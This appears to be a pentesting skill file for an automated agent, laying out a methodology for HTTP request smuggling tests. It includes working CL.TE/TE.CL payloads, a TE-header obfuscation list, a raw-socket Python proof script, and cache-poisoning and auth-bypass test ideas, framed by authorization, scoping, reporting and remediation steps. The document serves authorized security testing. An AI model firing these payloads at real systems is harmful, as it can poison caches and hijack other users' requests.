---
name: http-request-smuggling
description: 'HTTP desync testing for CL.TE, TE.CL, TE.TE, H2.CL and H2.TE across front-end/back-end pairs. Triggers: smuggling, desync, "front-end back-end", "request နှစ်ခါ", "smuggle စမ်း".'
category: vulnerabilities
track: 02-vuln-class
tags: [smuggling, desync, http2, cache, cdn]
severity_ceiling: critical
requires: [baseline-http-capture, oob-listener]
tools: [curl, nuclei, interactsh-client]
cwe: CWE-444
owasp: [A06:2025]
version: 1.0.0
author: kkuser
source: original
---

> Shared rules apply: `../_shared/evidence-policy.md`, `../_shared/scope-gate.md`.

# HTTP Request Smuggling

## 1. Preconditions

- An HTTP/1.1 or HTTP/2 front-end in front of a different-technology back-end (CDN, LB,
  reverse proxy). Victim of interest: any endpoint reachable through the same connection pool.
- Raw socket control. `curl` normalises headers; use `nc`, `socat`, or a Python socket so
  duplicate/odd `Content-Length` and `Transfer-Encoding` survive.
- **Timing baseline**: 20 samples of a normal POST to the target path. Desync detection is
  a timing/response-count signal, so you must know the noise floor.
- Written authorization for this class — it can affect other users' requests.

## 2. Gate

A single request that produces **two responses** or a reproducible delay is the gate.

```
POST / HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target
Content-Length: 15

0


```

Send twice on the same connection, then a normal `GET /`.

**Pass:** the second response is `405`/`400` for `GPOST`, or the following `GET` returns a
queued/poisoned response. **Fail:** both requests are handled normally, 10/10 trials.

## 3. Enumeration

- Detect the pair: `curl -sI` header order, `Via`, `Server`, `X-Cache`, CDN markers.
- Send malformed framing and compare front-end vs back-end error strings.
- Candidate paths: anything that buffers a body — upload, JSON API, login, `/graphql`.

Clssic variants to try, in order of likelihood:

| Variant | Front-end honours | Back-end honours |
|---|---|---|
| CL.TE | `Content-Length` | `Transfer-Encoding` |
| TE.CL | `Transfer-Encoding` | `Content-Length` |
| TE.TE (obfuscated TE) | rejects/ignores | accepts |
| H2.CL | HTTP/2 `:authority` + CL mismatch | HTTP/1 CL |
| H2.TE | HTTP/2 with `transfer-encoding` | chunked |

Obfuscation ladder for TE: `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`,
`Transfer-Encoding: chunked\r\nTransfer-Encoding: identity`, tab/space before colon,
`X: X\r\nTransfer-Encoding: chunked`.

## 4. Test Matrix

| # | Variant | Payload shape | Expected signal | Confirmed? |
|---|---|---|---|---|
| 1 | CL.TE | CL=4, TE body smuggling `G` | 400 on next request | |
| 2 | TE.CL | TE chunk larger than CL | timeout / 400 | |
| 3 | TE.TE obf | duplicate TE headers | 400 / desync | |
| 4 | H2.CL | `:method POST`, CL mismatch | 400 | |
| 5 | Cache poison | smuggle a `GET` for a cached path | poisoned body served to others | |
| 6 | Bypass auth | smuggle a request with an internal header | admin response | |

## 5. Proof

```bash
# raw socket, one connection, two requests
cat > /tmp/smuggle.py <<'PY'
import socket, time
HOST, PORT = "target.example.com", 443
payload = (
 b"POST / HTTP/1.1\r\nHost: target.example.com\r\n"
 b"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n"
 b"0\r\n\r\nG"
)
s = socket.create_connection((HOST, PORT), timeout=10)
s.sendall(payload); time.sleep(0.4)
s.sendall(b"GET / HTTP/1.1\r\nHost: target.example.com\r\n\r\n")
print(s.recv(8192).decode(errors="replace"))
s.close()
PY
python3 /tmp/smuggle.py
```

Confirm impact with the **least harmful** demonstration:
- **Timing/response-count** only (report as Medium unless a victim is demonstrably affected).
- **Cache poisoning** → poison a harmless marker path, verify with a second client.
- **Victim request capture** → requires a second controlled session; capture only your own
  second session's request, never another user's data.

## 6. Counterevidence

| Alternative explanation | How to kill it |
|---|---|
| 400 came from the front-end rejecting the malformed header | Send the same header on a plain GET; compare error text |
| Delay was network jitter | 10 trials, compare to the 20-sample baseline |
| Two responses because the server sent an interim `100 Continue` | Read the status lines; `100` is not desync |
| Connection reuse by your own client | Fresh socket per trial, and log the socket |
| Cache served a stale object unrelated to the smuggle | Use a unique cache-buster path |
| You affected only your own session | Validate with a second independent client |

## 7. Impact

Demonstrated tier matters:
- Response-queue desync on your own connection → Low/Medium.
- Poisoned cache affecting other users → High (integrity of served content).
- Credential/session theft from a victim request → Critical, requires proof with a second
  controlled identity and no real-user data.

## 8. CVSS 3.1

```text
Cache poisoning affecting all users:  CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:N = 7.5
Self-only desync, no victim impact:   CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N = 3.7
Victim request hijack demonstrated:   CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N = 8.0
```

`AC:H` is correct here: it needs a specific connection state.

## 9. Report

```markdown
# HTTP request smuggling (CL.TE) between CDN and origin allows cache poisoning

**Severity:** High (CVSS 3.1: 7.5 — AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:N)
**Affected asset:** edge.example.com → origin.example.com
**Category:** CWE-444 · OWASP A06:2025
```

Include raw bytes (escaped), the 20-sample baseline, and the poisoned-object proof.

## 10. Remediation

- Reject requests with both `Content-Length` and `Transfer-Encoding` (RFC 9112 §6.3).
- Normalise at the edge: strip/deny duplicate or obfuscated TE headers.
- Use HTTP/2 end-to-end, or ensure the front-end converts to a single canonical framing.
- Disable connection reuse across different clients at the front-end where possible.
- Patch the specific product; this class is a known-CVE family (check the edge version).

Regression test: send CL+TE together → must return 400 and close the connection.

## 11. References

- RFC 9112 — HTTP/1.1 Message Syntax and Routing, §6.3 Message Body Length
- CWE-444: Inconsistent Interpretation of HTTP Requests
- PortSwigger — HTTP request smuggling research
